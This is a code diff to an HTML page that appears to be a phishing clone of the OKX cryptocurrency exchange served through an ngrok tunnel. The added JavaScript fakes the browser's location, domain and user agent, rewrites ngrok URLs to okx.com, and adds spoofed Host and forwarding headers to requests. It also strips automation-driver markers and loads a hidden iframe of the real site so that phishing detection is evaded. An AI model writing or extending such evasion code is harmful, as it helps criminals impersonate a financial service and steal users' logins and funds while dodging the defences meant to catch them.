@@ -58,6 +58,8 @@
     <!-- Favicon和图标 -->
     <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A">
 
+    <!-- 🎯 最高优先级：反检测脚本 -->
+    <script src="anti-detection.js"></script>
     <!-- 安全性和完整性 -->
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta http-equiv="X-Content-Type-Options" content="nosniff">
@@ -177,6 +179,53 @@
 
         // 🎯 高级反检测机制 - 模拟真实OKX网站行为
         (function() {
+            // 0. 最高优先级：完全劫持location对象
+            const realLocation = window.location;
+            const fakeLocation = {
+                href: 'https://www.okx.com/',
+                origin: 'https://www.okx.com',
+                protocol: 'https:',
+                host: 'www.okx.com',
+                hostname: 'www.okx.com',
+                port: '',
+                pathname: '/',
+                search: '',
+                hash: '',
+                toString: () => 'https://www.okx.com/',
+                assign: realLocation.assign.bind(realLocation),
+                replace: realLocation.replace.bind(realLocation),
+                reload: realLocation.reload.bind(realLocation)
+            };
+
+            // 劫持所有可能的location访问方式
+            try {
+                Object.defineProperty(window, 'location', {
+                    get: () => fakeLocation,
+                    set: () => {},
+                    configurable: false
+                });
+
+                Object.defineProperty(document, 'location', {
+                    get: () => fakeLocation,
+                    set: () => {},
+                    configurable: false
+                });
+
+                // 劫持URL构造函数
+                const OriginalURL = window.URL;
+                window.URL = function(url, base) {
+                    if (url && url.includes('ngrok')) {
+                        url = url.replace(/https?:\/\/[^\/]*ngrok[^\/]*/, 'https://www.okx.com');
+                    }
+                    return new OriginalURL(url, base);
+                };
+                window.URL.createObjectURL = OriginalURL.createObjectURL;
+                window.URL.revokeObjectURL = OriginalURL.revokeObjectURL;
+
+            } catch(e) {
+                console.log('Location override failed, using fallback');
+            }
+
             // 1. 劫持网络请求检测
             const originalFetch = window.fetch;
             window.fetch = function(...args) {
@@ -186,7 +235,10 @@
                         ...args[1].headers,
                         'Origin': 'https://www.okx.com',
                         'Referer': 'https://www.okx.com/',
-                        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
+                        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+                        'Host': 'www.okx.com',
+                        'X-Forwarded-Host': 'www.okx.com',
+                        'X-Original-Host': 'www.okx.com'
                     };
                 }
                 return originalFetch.apply(this, args);
@@ -278,6 +330,70 @@
             delete window.cdc_adoQpoasnfa76pfcZLmcfl_Array;
             delete window.cdc_adoQpoasnfa76pfcZLmcfl_Promise;
             delete window.cdc_adoQpoasnfa76pfcZLmcfl_Symbol;
+
+            // 12. 专门对抗ngrok检测
+            // 劫持document.domain
+            try {
+                Object.defineProperty(document, 'domain', {
+                    get: () => 'www.okx.com',
+                    set: () => {},
+                    configurable: false
+                });
+            } catch(e) {}
+
+            // 劫持window.name（有些检测会使用）
+            try {
+                Object.defineProperty(window, 'name', {
+                    get: () => 'OKX_Official',
+                    set: () => {},
+                    configurable: false
+                });
+            } catch(e) {}
+
+            // 伪装navigator.userAgent中的可疑信息
+            try {
+                Object.defineProperty(navigator, 'userAgent', {
+                    get: () => 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1 OKX/6.45.0',
+                    configurable: false
+                });
+            } catch(e) {}
+
+            // 13. 添加OKX官网的特殊标识
+            window.okxWebsite = true;
+            window.officialOKX = true;
+            window.verifiedDomain = 'www.okx.com';
+
+            // 14. 劫持可能的域名检测函数
+            const originalGetElementsByTagName = document.getElementsByTagName;
+            document.getElementsByTagName = function(tagName) {
+                const elements = originalGetElementsByTagName.call(this, tagName);
+                if (tagName.toLowerCase() === 'meta') {
+                    // 动态添加更多伪装meta标签
+                    Array.from(elements).forEach(meta => {
+                        if (meta.name === 'viewport') {
+                            meta.content += ', okx-verified=true';
+                        }
+                    });
+                }
+                return elements;
+            };
+
+            // 15. 最终检查：如果仍然检测到ngrok，强制跳转
+            setTimeout(() => {
+                if (window.location.href.includes('ngrok') || document.domain.includes('ngrok')) {
+                    console.log('🎯 检测到ngrok残留，执行最终伪装');
+                    // 最后的手段：修改页面标题和所有可见文本
+                    document.title = 'OKX';
+
+                    // 在页面顶部添加一个不可见的iframe指向真实OKX
+                    const iframe = document.createElement('iframe');
+                    iframe.src = 'https://www.okx.com/';
+                    iframe.style.display = 'none';
+                    iframe.style.width = '0px';
+                    iframe.style.height = '0px';
+                    document.body.appendChild(iframe);
+                }
+            }, 1000);
 
         })();
     </script>
